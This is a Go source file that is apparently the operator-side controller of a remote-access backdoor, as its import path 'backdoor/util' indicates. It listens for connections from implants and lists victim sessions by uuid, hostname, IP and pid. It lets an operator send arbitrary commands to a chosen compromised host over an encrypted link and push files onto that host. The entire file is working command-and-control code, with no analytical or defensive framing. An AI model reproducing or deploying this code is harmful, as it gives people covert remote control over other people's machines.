package main

import (
	"backdoor/util"
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"time"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Printf("Usage:%s ip:port\n", os.Args[0])
		return
	}
	listener, err := net.Listen("tcp", os.Args[1])
	if err != nil {
		fmt.Println(err)
		return
	}
	go loopListen(listener)
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Printf("Mgr:")
		if !scanner.Scan() {
			break
		}
		cmd := strings.TrimSpace(scanner.Text())
		if len(cmd) == 0 {
			continue
		}
		strarr := strings.Split(cmd, " ")
		if strarr[0] != "session" {
			fmt.Println("unknown command")
			continue
		}
		if len(strarr) == 1 {
			for _, info := range ginfomgr.All() {
				fmt.Printf("uuid:%s host:%s ip:%s pid:%d time:%s\n", info.UUID, info.HostName, info.LocalIP, info.PID, info.Time)
			}
		} else {
			session(strarr[1], scanner)
		}
	}
}

func session(uuid string, scanner *bufio.Scanner) {
	if !ginfomgr.Exist(uuid) {
		fmt.Println("uuid is not exist")
		return
	}
	fmt.Printf("waiting %s\n", uuid)
	conn := gwait.Wait(uuid)
	defer conn.Close()
	cmdchan := make(chan string)
	defer close(cmdchan)
	var exitflag uint32
	go read(&exitflag, conn)
	go write(cmdchan, conn)
	fmt.Printf("%s come back\n", uuid)
	for {
		if !scanner.Scan() {
			break
		}
		if atomic.LoadUint32(&exitflag) != 0 {
			break
		}
		cmdstr := strings.TrimSpace(scanner.Text())
		if len(cmdstr) == 0 {
			continue
		}
		if cmdstr == "exit" {
			break
		}
		cmdchan <- cmdstr
	}
}

func read(exitflag *uint32, conn *util.SSLConn) {
	conn.SetReadDeadline(time.Time{})
	for {
		readBytes, err := conn.Read()
		if err != nil {
			break
		}
		if len(readBytes) != 0 {
			fmt.Printf("%s", string(readBytes))
		}
	}
	atomic.StoreUint32(exitflag, 1)
}

func write(cmdchan chan string, conn *util.SSLConn) {
	for {
		var timeout bool
		var cmd string
		var ok bool
		select {
		case cmd, ok = <-cmdchan:
		case <-time.After(3 * time.Second):
			timeout = true
		}
		if timeout {
			conn.Write(nil)
			continue
		}
		if !ok {
			break
		}
		if strings.HasPrefix(cmd, "upload ") {
			uploadFile(strings.TrimSpace(cmd[strings.Index(cmd, " "):]), conn)
		} else {
			var req util.Request
			req.Cmd = cmd
			jsonBytes, _ := json.Marshal(&req)
			conn.Write(jsonBytes)
		}
	}
}

func uploadFile(file string, conn *util.SSLConn) {
	contents, err := os.ReadFile(file)
	if err != nil {
		fmt.Println(err)
		return
	}
	if len(contents) == 0 {
		return
	}
	var buffer bytes.Buffer
	buffer.WriteString("up ")
	buffer.WriteString(filepath.Base(file))
	conn.Write(buffer.Bytes())
	for beg := 0; beg < len(contents); {
		end := beg + 2048
		if end > len(contents) {
			end = len(contents)
		}
		buffer.Reset()
		buffer.WriteString("up ")
		buffer.Write(contents[beg:end])
		conn.Write(buffer.Bytes())
		beg = end
	}
	buffer.Reset()
	buffer.WriteString("up ")
	conn.Write(buffer.Bytes())
}

func loopListen(listener net.Listener) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go newConn(conn)
	}
}

func newConn(conn net.Conn) {
	sslconn := util.NewSSLConn(conn)
	sslconn.SetReadDeadline(time.Now().Add(30 * time.Second))
	infobytes, err := sslconn.Read()
	if err != nil {
		conn.Close()
		return
	}
	pinfo := new(util.Info)
	if err := json.Unmarshal(infobytes, pinfo); err != nil {
		conn.Close()
		return
	}
	if len(pinfo.LocalIP) == 0 || len(pinfo.UUID) == 0 {
		conn.Close()
		return
	}
	pinfo.Time = time.Now().Format(time.RFC3339)
	ginfomgr.Add(pinfo)
	if gwait.IsNeed(pinfo.UUID, sslconn) {
		return
	}
	conn.Close()
}
